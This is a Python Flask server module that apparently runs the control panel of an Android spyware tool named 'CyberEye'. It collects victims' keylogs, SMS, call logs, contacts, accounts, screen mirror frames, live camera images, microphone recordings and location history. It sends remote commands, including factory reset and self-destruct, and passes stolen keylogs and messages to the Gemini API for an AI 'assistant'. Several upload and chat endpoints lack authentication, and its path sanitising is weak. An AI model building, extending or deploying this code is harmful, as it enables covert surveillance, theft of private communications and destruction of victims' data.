import os
import json
import time
import random
import string
import requests
from flask import Blueprint, request, jsonify, session, send_file
from extensions import socketio, emit_device_command
from config import GEMINI_API_KEY, BLACKLIST
from core.database import database, users_database, connected_devices, save_db, save_users_db
from core.auth import login_required, has_device_access
from core.parsers import get_and_parse_cloud_data, update_device_record
from sockets.events import check_geofences_for_device
from services.telegram_notifier import get_current_connection_status

api_bp = Blueprint('api', __name__)

@api_bp.route('/api/devices', endpoint='api_devices')
@login_required
def api_devices():
    devices = []
    username = session.get('username')
    
    if username in users_database.get("users", {}):
        users_database["users"][username]["last_seen"] = int(time.time())
        save_users_db()
        
    for k in database.keys():
        if k.lower() in BLACKLIST:
            continue
        if not has_device_access(username, k):
            continue
        
        v = database.get(k, {})
        online = k in connected_devices
        devices.append({
            "id": k,
            "model": v.get("info", {}).get("model", k),
            "lastSeen": v.get("lastSeen", 0),
            "online": online
        })
    return jsonify(devices)

def build_device_media_dict(device_id):
    """
    Standardizes device media items into a consistent dictionary of structured objects:
    { fbKey: { time, url, name, type, bytes, duration } }
    Combines registered database media and disk media from media/ subdirectories.
    Never indexes screen mirror frames or live camera frames.
    """
    media_dict = {}
    db_media = database.get(device_id, {}).get("media", {})
    if isinstance(db_media, dict):
        for k, v in db_media.items():
            if isinstance(v, dict) and "url" in v and "name" in v:
                v_name = v.get("name", "").lower()
                if any(x in v_name for x in ["mirror", "mirro", "live_camera"]):
                    continue
                media_dict[k] = v
            elif isinstance(v, list) and k in ["voice", "photos", "video"]:
                for fn in v:
                    fn_l = fn.lower()
                    if any(x in fn_l for x in ["mirror", "mirro", "live_camera"]):
                        continue
                    m_type = "audio" if k == "voice" else ("image" if k == "photos" else "video")
                    fb_key = f"m_{fn.split('.')[0]}"
                    media_dict[fb_key] = {
                        "time": int(time.time() * 1000),
                        "url": f"/api/media/stream/{device_id}/{fn}",
                        "name": fn,
                        "type": m_type
                    }

    # Only scan media/<device_id> subdirectories for physical files, NEVER data/<device_id>
    search_dirs = [
        (os.path.join("media", device_id, "voice"), "audio"),
        (os.path.join("media", device_id, "photos"), "image"),
        (os.path.join("media", device_id), None)
    ]
    known_names = {m.get("name") for m in media_dict.values() if isinstance(m, dict)}
    
    for s_dir, default_type in search_dirs:
        if not os.path.exists(s_dir) or not os.path.isdir(s_dir):
            continue
        try:
            for fn in os.listdir(s_dir):
                if fn in known_names:
                    continue
                fp = os.path.join(s_dir, fn)
                if not os.path.isfile(fp):
                    continue
                fn_lower = fn.lower()
                if fn_lower.endswith((".txt", ".json", ".tmp")):
                    continue
                # Strictly skip screen mirror and live camera frames
                if any(x in fn_lower for x in ["mirror", "mirro", "live_camera"]):
                    continue
                
                m_type = default_type
                if fn_lower.endswith((".mp3", ".wav", ".m4a", ".ogg", ".aac")) or fn_lower.startswith("audio_"):
                    m_type = "call_recording" if "call" in fn_lower else "audio"
                elif fn_lower.startswith("screenshot") or "screenshot" in fn_lower:
                    m_type = "screenshot"
                elif fn_lower.endswith((".jpg", ".jpeg", ".png", ".webp")) or fn_lower.startswith("img_") or fn_lower.startswith("cam_"):
                    m_type = "image"
                elif fn_lower.endswith((".mp4", ".mkv", ".webm")):
                    m_type = "video"
                
                if m_type:
                    mtime = int(os.path.getmtime(fp) * 1000)
                    fb_key = f"m_{mtime}_{fn.split('.')[0]}"
                    media_dict[fb_key] = {
                        "time": mtime,
                        "url": f"/api/media/stream/{device_id}/{fn}",
                        "name": fn,
                        "type": m_type,
                        "bytes": os.path.getsize(fp),
                        "duration": 15 if m_type == "audio" else 0
                    }
                    known_names.add(fn)
        except Exception as e:
            print(f"[Media Aggregator] Error scanning {s_dir}: {e}")

    return media_dict

@api_bp.route('/api/device/<device_id>/data', endpoint='api_device_data')
@login_required
def api_device_data(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({"error": "Not found"}), 404
    resp_data = dict(database[device_id])
    for cat in ["calls", "sms", "apps", "contacts", "accounts", "notifications", "files"]:
        local_list = get_and_parse_cloud_data(device_id, category=cat)
        resp_data[cat] = local_list if local_list else []

    resp_data['usage'] = {}
    for sub in ["daily", "weekly", "monthly"]:
        u_cat = f"usage_{sub}"
        u_list = get_and_parse_cloud_data(device_id, category=u_cat)
        resp_data['usage'][sub] = u_list if u_list else []

    resp_data['settings'] = database[device_id].get("settings", {})
    resp_data['media'] = build_device_media_dict(device_id)

    # Ensure live feed URLs are populated if media exists on disk
    if not resp_data.get("mirror_url"):
        mirror_file = os.path.join("media", device_id, "mirror.jpg")
        if os.path.exists(mirror_file):
            mtime = int(os.path.getmtime(mirror_file) * 1000)
            resp_data["mirror_url"] = f"/api/media/stream/{device_id}/mirror.jpg?t={mtime}"
            resp_data["mirror_time"] = mtime

    if not resp_data.get("live_camera_url"):
        cam_file = os.path.join("media", device_id, "live_camera.jpg")
        if os.path.exists(cam_file):
            mtime = int(os.path.getmtime(cam_file) * 1000)
            resp_data["live_camera_url"] = f"/api/media/stream/{device_id}/live_camera.jpg?t={mtime}"
            resp_data["live_camera_time"] = mtime

    return jsonify(resp_data)

@api_bp.route('/api/device/<device_id>/ai_context', endpoint='ai_context')
@login_required
def ai_context(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({"error": "Device not found"}), 404

    calls = get_and_parse_cloud_data(device_id, "calls") or []
    sms = get_and_parse_cloud_data(device_id, "sms") or []
    notifs = get_and_parse_cloud_data(device_id, "notifications") or []
    contacts = get_and_parse_cloud_data(device_id, "contacts") or []
    chats = database.get(device_id, {}).get('chats', {})

    keylogs = []
    if device_id in database and "keylogs" in database[device_id]:
        keylogs = list(database[device_id]["keylogs"].values())
    
    keylogs.sort(key=lambda x: x.get('time', 0))

    return jsonify({
        "device_id": device_id,
        "current_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "calls": calls[:40],
        "sms": sms[:40],
        "notifications": notifs[:30],
        "contacts": contacts,
        "chats": chats,
        "keylogs": keylogs[-600:]
    })

@api_bp.route('/api/device/<device_id>/ai_chat', methods=['POST'], endpoint='ai_chat')
def ai_chat(device_id):
    if device_id not in database:
        return jsonify({"error": "Device not found"}), 404
    user_msg = request.json.get('message')

    calls = get_and_parse_cloud_data(device_id, "calls") or []
    sms = get_and_parse_cloud_data(device_id, "sms") or []
    notifs = get_and_parse_cloud_data(device_id, "notifications") or []
    
    keylogs = []
    if device_id in database and "keylogs" in database[device_id]:
        keylogs = list(database[device_id]["keylogs"].values())

    context = f"You are CyberEye AI Assistant. Operating on Device: {device_id}\n"
    context += f"CALL LOGS: {json.dumps(calls[:20])}\n"
    context += f"SMS LOGS: {json.dumps(sms[:20])}\n"
    context += f"NOTIFICATIONS: {json.dumps(notifs[:15])}\n"
    context += f"RECENT KEYLOGS: {json.dumps(keylogs[:30])}\n"
    context += "\nInstruction: Answer the user's question based on this data. If data is empty, say no logs found yet. Speak professionally in English."

    try:
        url = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
        payload = {
            "contents": [{"parts": [{"text": f"{context}\n\nUser Question: {user_msg}"}]}]
        }
        headers = {"Content-Type": "application/json"}
        gemini_resp = requests.post(url, json=payload, headers=headers, timeout=20)
        result = gemini_resp.json()

        if 'candidates' in result and len(result['candidates']) > 0:
            ai_reply = result['candidates'][0]['content']['parts'][0]['text']
            return jsonify({"reply": ai_reply})
        else:
            url_pro = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-pro:generateContent?key={GEMINI_API_KEY}"
            resp_pro = requests.post(url_pro, json=payload, headers=headers, timeout=20)
            res_pro = resp_pro.json()
            if 'candidates' in res_pro and len(res_pro['candidates']) > 0:
                return jsonify({"reply": res_pro['candidates'][0]['content']['parts'][0]['text']})

            error_msg = result.get('error', {}).get('message', 'AI Model not responding.')
            return jsonify({"reply": f"AI Error: {error_msg}"})
    except Exception:
        return jsonify({"reply": "Network Error: System core unstable."})

@api_bp.route('/api/device/<device_id>/monitored_apps', methods=['GET', 'POST'], endpoint='api_monitored_apps')
@login_required
def api_monitored_apps(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        database[device_id] = {"_id": device_id}
    if "settings" not in database[device_id]:
        database[device_id]["settings"] = {}
    if "monitored_apps" not in database[device_id]["settings"]:
        database[device_id]["settings"]["monitored_apps"] = {}
    
    if request.method == 'POST':
        package = request.json.get('package', '').strip()
        name = request.json.get('name', '').strip()
        action = request.json.get('action')
        
        if not package:
            return jsonify({'success': False, 'error': 'Package name is required'}), 400
            
        key = package.replace('.', '_')
        if action == 'add':
            if not name:
                return jsonify({'success': False, 'error': 'App name is required for adding'}), 400
            database[device_id]["settings"]["monitored_apps"][key] = {
                "name": name,
                "package": package
            }
            save_db()
            
            sid = connected_devices.get(device_id)
            if sid:
                emit_device_command(device_id, {'action': f"MONITOR_APP:{package}"}, sid=sid)
            return jsonify({'success': True})
            
        elif action == 'remove':
            if key in database[device_id]["settings"]["monitored_apps"]:
                del database[device_id]["settings"]["monitored_apps"][key]
                save_db()
                
                sid = connected_devices.get(device_id)
                if sid:
                    emit_device_command(device_id, {'action': f"UNMONITOR_APP:{package}"}, sid=sid)
                return jsonify({'success': True})
            return jsonify({'success': False, 'error': 'App not found'}), 404
            
    return jsonify(database[device_id]["settings"]["monitored_apps"])

@api_bp.route('/api/device/<device_id>/mirror_status', endpoint='api_device_mirror')
@login_required
def api_device_mirror(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({})
    d = database[device_id]
    mirror_url = d.get("mirror_url")
    mirror_time = d.get("mirror_time")
    if not mirror_url:
        mirror_file = os.path.join("media", device_id, "mirror.jpg")
        if os.path.exists(mirror_file):
            mirror_time = int(os.path.getmtime(mirror_file) * 1000)
            mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={mirror_time}"
    info_val = d.get("info", {})
    bat = info_val.get("battery", "--") if isinstance(info_val, dict) else "--"
    return jsonify({
        "url": mirror_url,
        "time": mirror_time,
        "bat": bat
    })

@api_bp.route('/api/device/<device_id>/live_camera_status', endpoint='api_device_live_camera')
@login_required
def api_device_live_camera(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({})
    d = database[device_id]
    cam_url = d.get("live_camera_url")
    cam_time = d.get("live_camera_time")
    if not cam_url:
        cam_file = os.path.join("media", device_id, "live_camera.jpg")
        if os.path.exists(cam_file):
            cam_time = int(os.path.getmtime(cam_file) * 1000)
            cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={cam_time}"
    info_val = d.get("info", {})
    bat = info_val.get("battery", "--") if isinstance(info_val, dict) else "--"
    return jsonify({
        "url": cam_url,
        "time": cam_time,
        "bat": bat
    })

@api_bp.route('/api/device/<device_id>/live_audio_status', endpoint='api_device_live_audio')
@login_required
def api_device_live_audio(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({})
    d = database[device_id]
    audio_url = d.get("live_audio_url")
    audio_time = d.get("live_audio_time")
    if not audio_url:
        voice_dirs = [os.path.join("media", device_id, "voice"), os.path.join("media", device_id)]
        for vdir in voice_dirs:
            if os.path.exists(vdir) and os.path.isdir(vdir):
                files = [f for f in os.listdir(vdir) if f.endswith(('.mp3', '.m4a', '.wav', '.ogg')) and not os.path.isdir(os.path.join(vdir, f))]
                if files:
                    files.sort(key=lambda x: os.path.getmtime(os.path.join(vdir, x)), reverse=True)
                    latest = files[0]
                    audio_time = int(os.path.getmtime(os.path.join(vdir, latest)) * 1000)
                    audio_url = f"/api/media/stream/{device_id}/{latest}"
                    break
    return jsonify({
        "url": audio_url,
        "time": audio_time
    })

@api_bp.route('/api/device/<device_id>/previews', endpoint='api_device_previews')
@login_required
def api_device_previews(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({})
    return jsonify(database[device_id].get("previews", {}))

@api_bp.route('/api/media/stream/<device_id>/<path:filename>', endpoint='stream_media')
@login_required
def stream_media(device_id, filename):
    if not has_device_access(session.get('username'), device_id):
        return "Unauthorized", 403
    
    # Sanitize path to prevent directory traversal
    filename = filename.lstrip('/\\')
    
    candidates = [
        os.path.join("media", device_id, filename),
        os.path.join("media", device_id, "voice", filename),
        os.path.join("media", device_id, "photos", filename),
        os.path.join("media", device_id, "video", filename),
        os.path.join("data", device_id, filename)
    ]
    for p in candidates:
        if os.path.exists(p) and os.path.isfile(p):
            return send_file(p)
    return "Not Found", 404

@api_bp.route('/api/device/<device_id>/upload_media', methods=['POST'], endpoint='api_device_upload_media')
def api_device_upload_media(device_id):
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file part"}), 400
    file = request.files['file']
    category = request.form.get('category', 'files')
    if file.filename == '':
        return jsonify({"success": False, "error": "No selected file"}), 400
        
    os.makedirs(os.path.join("data", device_id), exist_ok=True)
    os.makedirs(os.path.join("media", device_id), exist_ok=True)
    
    filename = file.filename
    text_categories = ["calls", "sms", "contacts", "apps", "accounts", "notifications", "usage_daily", "usage_weekly", "usage_monthly", "files", "info"]
    
    if category in text_categories:
        file_path = os.path.join("data", device_id, f"{category}.txt")
        file.save(file_path)
        
        if device_id not in database:
            database[device_id] = {"_id": device_id}
        if "refs" not in database[device_id]:
            database[device_id]["refs"] = {}
        database[device_id]["refs"][category] = int(time.time() * 1000)
        database[device_id]["lastSeen"] = int(time.time() * 1000)
        
        if category == "info":
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    info_content = f.read()
                update_device_record(device_id, "info", info_content)
                update_device_record(device_id, "info", f"ip: {request.remote_addr}\n")
            except Exception as e:
                print(f"[Upload] Error parsing info file: {e}")
                
        save_db()
        if category == "files":
            socketio.emit('files_updated', {'device_id': device_id})
    else:
        if category == "wallpaper":
            file_path = os.path.join("media", device_id, "wallpaper.jpg")
            file.save(file_path)
            
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            database[device_id]["wallpaper_url"] = f"/api/media/stream/{device_id}/wallpaper.jpg?t={int(time.time()*1000)}"
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': database[device_id]["wallpaper_url"]}, room=device_id)
        elif category in ["mirror", "screen", "live_screen"] or any(k in filename.lower() for k in ["mirror", "mirro", "mirrro"]):
            file_path = os.path.join("media", device_id, "mirror.jpg")
            file.save(file_path)
            
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            now_ms = int(time.time() * 1000)
            mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
            database[device_id]["mirror_url"] = mirror_url
            database[device_id]["mirror_time"] = now_ms
            database[device_id]["lastSeen"] = now_ms
            save_db()
            socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
            socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
            return jsonify({"success": True, "url": mirror_url})
        elif category in ["live_camera", "camera_live"] or any(k in filename.lower() for k in ["live_camera", "livecam", "live_cam"]):
            file_path = os.path.join("media", device_id, "live_camera.jpg")
            file.save(file_path)
            
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            now_ms = int(time.time() * 1000)
            cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
            database[device_id]["live_camera_url"] = cam_url
            database[device_id]["live_camera_time"] = now_ms
            database[device_id]["lastSeen"] = now_ms
            save_db()
            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
            return jsonify({"success": True, "url": cam_url})
        elif category in ["live_audio", "audio", "voice", "recording", "recordings"] or filename.lower().startswith("audio_") or filename.lower().endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac')):
            voice_dir = os.path.join("media", device_id, "voice")
            os.makedirs(voice_dir, exist_ok=True)
            voice_file_path = os.path.join(voice_dir, filename)
            file.save(voice_file_path)

            direct_path = os.path.join("media", device_id, filename)
            if not os.path.exists(direct_path):
                try:
                    import shutil
                    shutil.copyfile(voice_file_path, direct_path)
                except Exception:
                    pass
            
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            chunk_url = f"/api/media/stream/{device_id}/{filename}"
            now_ms = int(time.time() * 1000)
            database[device_id]["live_audio_url"] = chunk_url
            database[device_id]["live_audio_time"] = now_ms
            database[device_id]["lastSeen"] = now_ms

            if "media" not in database[device_id] or not isinstance(database[device_id]["media"], dict):
                database[device_id]["media"] = {}
            fbKey = f"m_{now_ms}_{filename.split('.')[0]}"
            database[device_id]["media"][fbKey] = {
                "time": now_ms,
                "url": chunk_url,
                "name": filename,
                "type": "call_recording" if "call" in filename.lower() else "audio",
                "bytes": os.path.getsize(voice_file_path) if os.path.exists(voice_file_path) else 0,
                "duration": 15
            }
            save_db()
            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url})
            return jsonify({"success": True})
        elif category in ["photo", "photos", "camera", "image", "screenshot", "screenshots", "screencap"] or filename.lower().startswith(("img_", "screenshot", "cam_")):
            # Absolute guard against mirror or live_camera
            fn_l = filename.lower()
            if any(k in fn_l for k in ["mirror", "mirro", "mirrro"]):
                mirror_path = os.path.join("media", device_id, "mirror.jpg")
                file.save(mirror_path)
                now_ms = int(time.time() * 1000)
                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
                if device_id not in database: database[device_id] = {"_id": device_id}
                database[device_id]["mirror_url"] = mirror_url
                database[device_id]["mirror_time"] = now_ms
                save_db()
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
                return jsonify({"success": True, "url": mirror_url})

            if any(k in fn_l for k in ["live_camera", "livecam", "live_cam"]):
                cam_path = os.path.join("media", device_id, "live_camera.jpg")
                file.save(cam_path)
                now_ms = int(time.time() * 1000)
                cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
                if device_id not in database: database[device_id] = {"_id": device_id}
                database[device_id]["live_camera_url"] = cam_url
                database[device_id]["live_camera_time"] = now_ms
                save_db()
                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
                return jsonify({"success": True, "url": cam_url})

            photos_dir = os.path.join("media", device_id, "photos")
            os.makedirs(photos_dir, exist_ok=True)
            photo_file_path = os.path.join(photos_dir, filename)
            file.save(photo_file_path)

            direct_path = os.path.join("media", device_id, filename)
            if not os.path.exists(direct_path):
                try:
                    import shutil
                    shutil.copyfile(photo_file_path, direct_path)
                except Exception:
                    pass

            now_ms = int(time.time() * 1000)
            media_type = "screenshot" if ("screenshot" in fn_l or "screencap" in category or "screenshot" in category) else "image"
            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
            media_url = f"/api/media/stream/{device_id}/{filename}"

            if device_id not in database:
                database[device_id] = {"_id": device_id}
            if "media" not in database[device_id] or not isinstance(database[device_id]["media"], dict):
                database[device_id]["media"] = {}
            database[device_id]["media"][fb_key] = {
                "time": now_ms,
                "url": media_url,
                "name": filename,
                "type": media_type,
                "bytes": os.path.getsize(photo_file_path) if os.path.exists(photo_file_path) else 0
            }
            database[device_id]["lastSeen"] = now_ms
            save_db()
            return jsonify({"success": True})
        elif category == "previews":
            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            
            path_on_device = request.form.get('path', '')
            fbKey = f"p_{int(time.time() * 1000)}"
            preview_entry = {
                "time": int(time.time() * 1000),
                "url": f"/api/media/stream/{device_id}/{filename}",
                "name": filename,
                "path": path_on_device
            }
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            if "previews" not in database[device_id]:
                database[device_id]["previews"] = {}
            database[device_id]["previews"][fbKey] = preview_entry
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
        else:
            fn_l = filename.lower()
            if any(k in fn_l for k in ["mirror", "mirro", "mirrro"]):
                mirror_path = os.path.join("media", device_id, "mirror.jpg")
                file.save(mirror_path)
                now_ms = int(time.time() * 1000)
                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
                if device_id not in database: database[device_id] = {"_id": device_id}
                database[device_id]["mirror_url"] = mirror_url
                database[device_id]["mirror_time"] = now_ms
                save_db()
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
                return jsonify({"success": True, "url": mirror_url})

            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            
            media_type = "file"
            if category == "screenshot":
                media_type = "screenshot"
            elif category == "image":
                media_type = "image"
            elif category == "audio":
                media_type = "audio"
            elif category == "call_recording":
                media_type = "call_recording"
                
            fbKey = f"m_{int(time.time() * 1000)}"
            media_entry = {
                "time": int(time.time() * 1000),
                "url": f"/api/media/stream/{device_id}/{filename}",
                "name": filename,
                "type": media_type,
                "path": file_path
            }
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            if "media" not in database[device_id]:
                database[device_id]["media"] = {}
            database[device_id]["media"][fbKey] = media_entry
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            
    return jsonify({"success": True})

@api_bp.route('/api/device/<device_id>/action', methods=['POST'], endpoint='api_device_action')
@login_required
def api_device_action(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    action = request.json.get('action')
    action_map = {
        'GET_DEVICE_INFO': 'DEVICE_INFO', 'DUMP_CALLS': 'CALL_LOG', 'DUMP_SMS': 'SMS_LOG',
        'DUMP_CONTACTS': 'CONTACTS', 'GET_ACCOUNTS': 'ACCOUNTS', 'LIST_APPS': 'APPS_LIST',
        'TAKE_SCREENSHOT': 'SCREENSHOT', 'TAKE_PHOTO_FRONT': 'PHOTO_FRONT', 'TAKE_PHOTO_REAR': 'PHOTO_REAR',
        'RECORD_AUDIO_15': 'MIC_15S', 'RECORD_AUDIO_300': 'AUDIO_300', 'RECORD_AUDIO_600': 'AUDIO_600',
        'LOCK_DEVICE': 'LOCK_SCREEN', 'FACTORY_RESET': 'FACTORY_RESET',
        'FORCE_LOC_V1': 'FORCE_LOC_V1', 'FORCE_LOC_V2': 'FORCE_LOC_V2',
        'SELF_DESTRUCT': 'SELF_DESTRUCT',
        'GET_LOCATION': 'GET_LOCATION',
        'USAGE_DAILY': 'USAGE_DAILY',
        'USAGE_WEEKLY': 'USAGE_WEEKLY',
        'USAGE_MONTHLY': 'USAGE_MONTHLY',
        'START_LOCK_TRACK': 'START_LOCK_TRACK',
        'STOP_LOCK_TRACK': 'STOP_LOCK_TRACK'
    }

    if ':' in action:
        cmd = action
        parts = action.split(':', 1)
        action_type = parts[0]
        value = parts[1].strip()

        if action_type in ['BLOCK_APP', 'UNBLOCK_APP', 'BLOCK_WEB', 'UNBLOCK_WEB']:
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]:
                database[device_id]["settings"] = {}
            settings = database[device_id]["settings"]
            
            if action_type == 'BLOCK_APP':
                if "blocked_apps" not in settings:
                    settings["blocked_apps"] = {}
                key = str(hash(value))
                settings["blocked_apps"][key] = value
            elif action_type == 'UNBLOCK_APP':
                if "blocked_apps" in settings:
                    keys_to_del = [k for k, v in settings["blocked_apps"].items() if v == value]
                    for k in keys_to_del:
                        settings["blocked_apps"].pop(k)
            elif action_type == 'BLOCK_WEB':
                if "blocked_webs" not in settings:
                    settings["blocked_webs"] = {}
                key = str(hash(value))
                settings["blocked_webs"][key] = value
            elif action_type == 'UNBLOCK_WEB':
                if "blocked_webs" in settings:
                    keys_to_del = [k for k, v in settings["blocked_webs"].items() if v == value]
                    for k in keys_to_del:
                        settings["blocked_webs"].pop(k)
            save_db()
    else:
        cmd = action_map.get(action, action)
        if cmd == 'START_LOCK_TRACK':
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]:
                database[device_id]["settings"] = {}
            database[device_id]["settings"]["lock_track_enabled"] = True
            save_db()
        elif cmd == 'STOP_LOCK_TRACK':
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]:
                database[device_id]["settings"] = {}
            database[device_id]["settings"]["lock_track_enabled"] = False
            save_db()

    sid = connected_devices.get(device_id)
    if sid:
        print(f"[Socket.io] Emitting Command: {cmd} to Device: {device_id} (sid: {sid})")
        emit_device_command(device_id, {'action': cmd}, sid=sid)
        update_device_record(device_id, "logs", f"Sent command: {cmd}")
        return jsonify({'success': True})
    else:
        if cmd in ['START_LOCK_TRACK', 'STOP_LOCK_TRACK']:
            return jsonify({'success': True, 'queued': True})
        return jsonify({'success': False, 'error': 'Device offline'}), 400

@api_bp.route('/api/device/<device_id>/clear_route', methods=['POST'], endpoint='api_device_clear_route')
@login_required
def api_device_clear_route(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({"success": False, "error": "Device not found"}), 404
        
    req_data = request.json or {}
    target_date = req_data.get('date', 'today')
    
    if target_date == 'today':
        database[device_id]['today_route'] = []
        update_device_record(device_id, "logs", "Cleared today's route log")
    else:
        history = database[device_id].get('route_history', [])
        new_history = [item for item in history if item.get('date') != target_date]
        database[device_id]['route_history'] = new_history
        update_device_record(device_id, "logs", f"Deleted route history for {target_date}")
        
    save_db()
    return jsonify({"success": True})

@api_bp.route('/api/device/<device_id>/location', methods=['POST'], endpoint='api_device_location')
def api_device_location(device_id):
    data = request.json
    if not data:
        return jsonify({"success": False, "error": "Invalid JSON payload"}), 400
        
    lat = data.get("lat")
    lng = data.get("lng")
    upload_time = data.get("time", int(time.time() * 1000))
    
    if lat is None or lng is None:
        return jsonify({"success": False, "error": "Coordinates missing"}), 400
        
    if device_id not in database:
        database[device_id] = {"_id": device_id}
        
    settings = database.get(device_id, {}).get("settings", {})
    info = database.get(device_id, {}).get("info", {})
    
    if settings.get("lock_track_enabled", False) or info.get("lock_track_enabled") == "true":
        today_route = database[device_id].get("today_route", [])
        current_time = time.localtime(upload_time / 1000)
        current_date_str = time.strftime("%Y-%m-%d", current_time)
        today_route_date = database[device_id].get("today_route_date", current_date_str)
        
        if today_route_date != current_date_str:
            if today_route:
                route_history = database[device_id].get("route_history", [])
                route_history.append({
                    "date": today_route_date,
                    "route": today_route
                })
                database[device_id]["route_history"] = route_history[-30:]
            today_route = []
            database[device_id]["today_route_date"] = current_date_str
            
        today_route.append({
            "lat": lat,
            "lng": lng,
            "time": upload_time
        })
        database[device_id]["today_route"] = today_route
        database[device_id]["today_route_date"] = current_date_str
        
    update_device_record(device_id, "location", data)
    check_geofences_for_device(socketio, device_id, data)
    
    socketio.emit('location_update', {
        'device_id': device_id,
        'lat': lat,
        'lng': lng,
        'time': upload_time
    })
    
    return jsonify({"success": True})

@api_bp.route('/api/device/<device_id>/geofence/add', methods=['POST'], endpoint='add_geofence')
@login_required
def add_geofence(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    
    data = request.json
    if not data:
        return jsonify({"success": False, "error": "Invalid data"}), 400
        
    lat = data.get("lat")
    lng = data.get("lng")
    radius = data.get("radius")
    name = data.get("name", "Unknown Fence")
    fence_type = data.get("type", "allowed")
    
    if lat is None or lng is None or radius is None:
        return jsonify({"success": False, "error": "Coordinates/radius missing"}), 400
        
    if device_id not in database:
        database[device_id] = {"_id": device_id}
        
    if "settings" not in database[device_id]:
        database[device_id]["settings"] = {}
        
    if "geofences" not in database[device_id]["settings"]:
        database[device_id]["settings"]["geofences"] = []
        
    fence_id = str(int(time.time() * 1000))
    new_fence = {
        "id": fence_id,
        "lat": float(lat),
        "lng": float(lng),
        "radius": int(radius),
        "name": str(name),
        "type": str(fence_type)
    }
    
    database[device_id]["settings"]["geofences"].append(new_fence)
    save_db()
    update_device_record(device_id, "logs", f"Added geofence zone: '{name}' ({fence_type.upper()})")
    return jsonify({"success": True, "fence": new_fence})

@api_bp.route('/api/device/<device_id>/geofence/delete/<fence_id>', methods=['POST'], endpoint='delete_geofence')
@login_required
def delete_geofence(device_id, fence_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
        
    if device_id in database and "settings" in database[device_id] and "geofences" in database[device_id]["settings"]:
        geofences = database[device_id]["settings"]["geofences"]
        fence = next((f for f in geofences if f.get("id") == fence_id), None)
        name = fence.get("name", "Unknown") if fence else "Unknown"
        
        database[device_id]["settings"]["geofences"] = [f for f in geofences if f.get("id") != fence_id]
        
        if "last_geofence_states" in database[device_id] and fence_id in database[device_id]["last_geofence_states"]:
            database[device_id]["last_geofence_states"].pop(fence_id)
            
        save_db()
        update_device_record(device_id, "logs", f"Deleted geofence zone: '{name}'")
        return jsonify({"success": True})
        
    return jsonify({"success": False, "error": "Geofence not found"}), 404

@api_bp.route('/api/device/<device_id>/clear_keylogs', methods=['POST'], endpoint='clear_keylogs')
@login_required
def clear_keylogs(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id in database:
        database[device_id]["keylogs"] = {}
        save_db()
    return jsonify({'success': True})

